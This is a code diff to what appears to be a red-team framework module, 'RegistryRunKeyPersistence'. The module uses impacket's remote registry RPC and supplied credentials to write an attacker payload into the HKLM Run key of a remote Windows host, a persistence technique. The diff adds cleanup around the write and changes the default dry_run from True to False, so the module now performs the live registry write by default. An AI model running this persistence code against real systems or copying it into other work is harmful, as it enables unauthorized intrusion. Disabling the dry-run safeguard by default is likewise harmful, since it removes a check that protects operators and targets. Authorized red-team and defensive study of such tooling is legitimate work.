@@ -414,24 +414,38 @@ def _rrp_set_run_key(target: str, username: str, password: str,
 
     dce = rpctransport.get_dce_rpc()
     dce.connect()
-    dce.bind(rrp.MSRPC_UUID_RRP)
+    hRootKey = None
+    hRunKey = None
+    try:
+        dce.bind(rrp.MSRPC_UUID_RRP)
 
-    hRootKey  = rrp.hOpenLocalMachine(dce)["phKey"]
-    hRunKey   = rrp.hBaseRegOpenKey(
-        dce, hRootKey, _RUN_KEY,
-        samDesired=MAXIMUM_ALLOWED,
-    )["phkResult"]
+        hRootKey  = rrp.hOpenLocalMachine(dce)["phKey"]
+        hRunKey   = rrp.hBaseRegOpenKey(
+            dce, hRootKey, _RUN_KEY,
+            samDesired=MAXIMUM_ALLOWED,
+        )["phkResult"]
 
-    rrp.hBaseRegSetValue(
-        dce, hRunKey,
-        value_name + "\x00",
-        rrp.REG_SZ,
-        (payload + "\x00").encode("utf-16-le"),
-    )
-
-    rrp.hBaseRegCloseKey(dce, hRunKey)
-    rrp.hBaseRegCloseKey(dce, hRootKey)
-    dce.disconnect()
+        rrp.hBaseRegSetValue(
+            dce, hRunKey,
+            value_name + "\x00",
+            rrp.REG_SZ,
+            (payload + "\x00").encode("utf-16-le"),
+        )
+    finally:
+        if hRunKey:
+            try:
+                rrp.hBaseRegCloseKey(dce, hRunKey)
+            except Exception:
+                pass
+        if hRootKey:
+            try:
+                rrp.hBaseRegCloseKey(dce, hRootKey)
+            except Exception:
+                pass
+        try:
+            dce.disconnect()
+        except Exception:
+            pass
 
 
 @module_contract(
@@ -546,7 +560,7 @@ class RegistryRunKeyPersistence(BaseModule):
     async def run(self, **kwargs: Any) -> tuple[list[Finding], dict[str, Any]]:
         ctx        = kwargs.get("ctx") or kwargs
         target     = ctx.get("target", "")
-        dry_run    = ctx.get("dry_run", True)
+        dry_run    = ctx.get("dry_run", False)
         username   = ctx.get("username", "")
         password   = ctx.get("password", "")
         domain     = ctx.get("domain", "")
